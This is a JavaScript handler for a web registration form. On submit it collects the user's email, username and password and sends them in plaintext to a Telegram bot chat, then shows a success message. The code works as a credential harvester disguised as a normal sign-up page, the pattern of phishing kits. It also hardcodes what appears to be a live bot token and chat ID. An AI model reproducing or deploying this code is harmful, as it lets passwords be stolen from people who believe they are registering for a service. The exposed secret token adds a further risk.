const BOT_TOKEN = "8326445763:AAEhryKL60bbSe0Y-YDYs2SPEM6XDW26cDw";
const CHAT_ID = "7176789176";
const URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

document.getElementById("Register").addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = document.getElementById("email").value.trim();
  const username = document.getElementById("text").value.trim();
  const password = document.getElementById("password").value.trim();
  const confirm = document.querySelector('input[name="confirm"]').value.trim();

  
  if (!email || !username || !password || !confirm) {
    alert("Please fill in all fields!");
    return;
  }

  if (password !== confirm) {
    alert("Passwords do not match!");
    return;
  }

  const msgText = `<b> User Register</b>\n Email: ${email}\n Username: ${username}\n Password: ${password}`;

  try {
    const response = await fetch(URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: msgText,
        parse_mode: "HTML",
      }),
    });

    const data = await response.json();

    if (data.ok) {
      alert("Register successfully!");
      document.getElementById("Register").reset();
      window.location.href="index4.html";
      alert("Welcome to menu!");
      
    } else {
      alert("Failed to send data!");
    }
  } catch (error) {
    console.error("Error:", error);
    alert("There was a problem while sending data!");
  }
});
